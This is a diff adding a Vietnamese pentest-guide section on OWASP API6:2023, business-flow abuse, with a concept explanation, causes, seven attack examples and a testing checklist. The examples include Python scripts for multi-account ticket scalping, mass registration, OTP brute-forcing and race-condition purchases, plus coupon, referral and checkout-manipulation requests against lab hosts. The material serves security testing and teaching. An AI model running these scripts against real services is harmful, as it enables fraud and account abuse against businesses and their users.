@@ -28,6 +28,11 @@
   - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-4)
   - [Các cách khai thác](#các-cách-khai-thác-4)
   - [Checklist khi test](#checklist-khi-test-4)
+- [API6:2023 — Unrestricted Access to Sensitive Business Flows](#api62023--unrestricted-access-to-sensitive-business-flows)
+  - [Khái niệm](#khái-niệm-5)
+  - [Tại sao bị lỗi?](#tại-sao-bị-lỗi-5)
+  - [Các cách khai thác](#các-cách-khai-thác-5)
+  - [Checklist khi test](#checklist-khi-test-5)
 
 ---
 
@@ -835,3 +840,155 @@ Parse file JSON ra → có ngay toàn bộ endpoint, method, parameter để tes
 - [ ] Kiểm tra JS bundle của frontend — thường chứa URL endpoint ẩn
 - [ ] Thử path traversal trong endpoint (`/users/me/../admin/`)
 - [ ] Kiểm tra endpoint có phân biệt role không hay chỉ check đăng nhập
+
+---
+
+# API6:2023 — Unrestricted Access to Sensitive Business Flows
+
+## Khái niệm
+
+Lỗ hổng này không phải lỗi code — API hoạt động đúng như thiết kế, nhưng **attacker lạm dụng luồng nghiệp vụ (business flow) theo cách mà con người bình thường không làm** — thường bằng cách tự động hóa (automation) ở tốc độ phi thực tế.
+
+**Ví dụ thực tế:**
+App bán vé concert có giới hạn "mỗi người mua tối đa 2 vé". Giới hạn này chỉ được check trên UI. Attacker viết script tạo 500 tài khoản, mỗi tài khoản mua 2 vé → vét sạch 1000 vé trong vài giây trước khi người dùng thật kịp vào.
+
+**Phân biệt với API4:**
+- **API4** — tấn công vào *tài nguyên kỹ thuật* (CPU, memory, bandwidth)
+- **API6** — tấn công vào *giá trị kinh doanh* (vé, mã giảm giá, sản phẩm, điểm thưởng)
+
+**Điểm mấu chốt:**
+API hoạt động đúng, auth đúng, nhưng không có cơ chế phân biệt **hành vi con người** với **hành vi bot**.
+
+---
+
+## Tại sao bị lỗi?
+
+| Nguyên nhân | Mô tả |
+|-------------|-------|
+| Giới hạn chỉ ở UI | Server không enforce giới hạn số lượng |
+| Không phân biệt bot/người | Không có CAPTCHA, device fingerprint, behavioral check |
+| Không giới hạn tần suất theo business | Rate limit kỹ thuật có nhưng không đủ chặn automation |
+| Không detect bất thường | 500 tài khoản mới mua hàng trong 1 phút không bị flag |
+
+---
+
+## Các cách khai thác
+
+### 1. Scalping — Vét Sạch Hàng Giới Hạn
+Tự động hóa việc mua hàng trước khi người dùng thật kịp.
+```python
+# [ATTACKER] — mua hết vé bằng nhiều account
+import requests, threading
+
+def buy_ticket(token):
+    requests.post("https://target.lab/api/tickets/buy",
+        headers={"Authorization": f"Bearer {token}"},
+        json={"event_id": 99, "quantity": 2})
+
+tokens = ["<token_1>", "<token_2>", ...]  # 500 account
+threads = [threading.Thread(target=buy_ticket, args=(t,)) for t in tokens]
+[t.start() for t in threads]
+```
+
+---
+
+### 2. Coupon / Promo Code Abuse
+Mã giảm giá giới hạn 1 lần/user nhưng không check ở server.
+```http
+# Dùng cùng mã nhiều lần với các account khác nhau
+POST /api/orders/apply-coupon HTTP/1.1
+{"coupon": "SALE50", "order_id": 1001}  ← account A
+
+POST /api/orders/apply-coupon HTTP/1.1
+{"coupon": "SALE50", "order_id": 1002}  ← account B
+```
+Hoặc dùng lại mã sau khi đã hủy đơn hàng — mã chưa bị invalidate.
+
+---
+
+### 3. Referral / Reward Abuse
+Hệ thống điểm thưởng khi giới thiệu bạn bè — tự giới thiệu chính mình bằng nhiều account.
+```http
+# Tạo vòng lặp: account A giới thiệu B, B giới thiệu C, C giới thiệu A
+POST /api/referral/apply HTTP/1.1
+{"referral_code": "CODE_A"}  ← gọi từ account B
+
+POST /api/referral/apply HTTP/1.1
+{"referral_code": "CODE_B"}  ← gọi từ account C
+```
+
+---
+
+### 4. Account / Resource Enumeration Hàng Loạt
+Tự động hóa việc tạo tài khoản để lạm dụng free tier / trial.
+```python
+# Tạo hàng loạt account để hưởng free credit
+for i in range(1000):
+    requests.post("https://target.lab/api/register", json={
+        "email": f"attacker+{i}@lab.local",
+        "password": "pass123"
+    })
+    # Mỗi account mới được $5 credit miễn phí → $5000 tổng cộng
+```
+
+---
+
+### 5. Cart / Checkout Flow Manipulation
+Thao túng luồng thanh toán để mua hàng với giá sai.
+```http
+# Bước 1: Thêm sản phẩm vào giỏ — giá $100
+POST /api/cart/add
+{"product_id": 5, "quantity": 1}
+
+# Bước 2: Áp mã giảm giá — giảm 90%
+POST /api/cart/coupon
+{"code": "STAFF90"}
+
+# Bước 3: Checkout — server không tính lại giá, tin vào giá từ session
+POST /api/checkout
+{"payment_method": "card"}
+```
+
+---
+
+### 6. OTP / Verification Bypass bằng Automation
+Tự động hóa bước xác minh để tạo hàng loạt tài khoản đã verify.
+```python
+# Tạo account + brute force OTP liên tục
+for phone in phone_list:
+    r = requests.post("/api/register", json={"phone": phone})
+    for otp in range(1000, 9999):  # 4-digit OTP
+        r = requests.post("/api/verify", json={"phone": phone, "otp": otp})
+        if r.status_code == 200:
+            break
+```
+
+---
+
+### 7. Flash Sale / Limited Item Race Condition
+Gửi nhiều request đồng thời để mua vượt giới hạn số lượng.
+```python
+# Gửi 50 request cùng lúc — server xử lý song song
+# Nếu không có lock → mua được nhiều hơn giới hạn
+import requests, concurrent.futures
+
+def buy():
+    return requests.post("/api/flash-sale/buy",
+        headers={"Authorization": "Bearer <token>"},
+        json={"item_id": 1})
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
+    futures = [ex.submit(buy) for _ in range(50)]
+```
+
+---
+
+## Checklist khi test
+
+- [ ] Tìm luồng có giá trị kinh doanh: mua hàng, đặt vé, đổi điểm, áp mã giảm giá
+- [ ] Thử gọi lặp lại cùng một action nhiều lần — có bị chặn không?
+- [ ] Kiểm tra giới hạn số lượng có được enforce ở server hay chỉ ở UI
+- [ ] Thử race condition trên các endpoint mua hàng / đổi thưởng
+- [ ] Kiểm tra mã giảm giá có bị invalidate sau khi dùng / hủy đơn không
+- [ ] Tạo nhiều account test — mỗi account có được hưởng ưu đãi riêng không?
+- [ ] Kiểm tra giá có được tính lại ở server khi checkout không hay tin vào client
